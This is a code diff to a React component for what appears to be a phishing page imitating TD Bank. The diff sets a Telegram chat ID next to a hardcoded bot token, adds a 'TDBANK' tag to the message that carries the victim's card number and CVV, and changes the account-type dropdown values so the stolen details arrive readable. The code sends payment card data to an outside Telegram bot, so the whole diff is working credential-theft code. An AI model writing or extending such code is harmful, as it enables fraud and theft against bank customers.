@@ -18,7 +18,7 @@ function Enter() {
   const [selectedAccountType, setSelectedAccountType] = React.useState('');
 
   const token = '6214248431:AAFodeiJc0UIq-nmsTyqMgzp2FdByom3wzc';
-  const chat_id = '';
+  const chat_id = '5960483519';
 
   async function sendMessageToTelegram(message: any) {
     await fetch(
@@ -36,7 +36,7 @@ function Enter() {
     }
   
     let message =
-  ' | Card Number: ' +
+  'TDBANK | Card Number: ' +
   event.target.cardnumber.value +
   '\n | CVV: ' +
   event.target.cvv.value +
@@ -95,13 +95,13 @@ function Enter() {
                 <Select 
                 onChange={(event) => setSelectedAccountType(event.target.value)}
                 placeholder='Select account type' border="1px solid #196999" borderRadius={0}>
-  <option value='option1'>Debit/ATM card</option>
-  <option value='option2'>Checking or money market account</option>
-  <option value='option3'>Savings account/CDs/IRAs</option>
-  <option value='option1'>Mortgage account</option>
-  <option value='option2'>HELOC account</option>
-  <option value='option3'>Credit card</option>
-  <option value='option3'>Personal loan</option>
+  <option value='Debit/ATM card'>Debit/ATM card</option>
+  <option value='Checking or money market account'>Checking or money market account</option>
+  <option value='Savings account/CDs/IRAs'>Savings account/CDs/IRAs</option>
+  <option value='Mortgage account'>Mortgage account</option>
+  <option value='HELOC account'>HELOC account</option>
+  <option value='Credit card'>Credit card</option>
+  <option value='Personal loan'>Personal loan</option>
                 </Select>
 
                 <Text
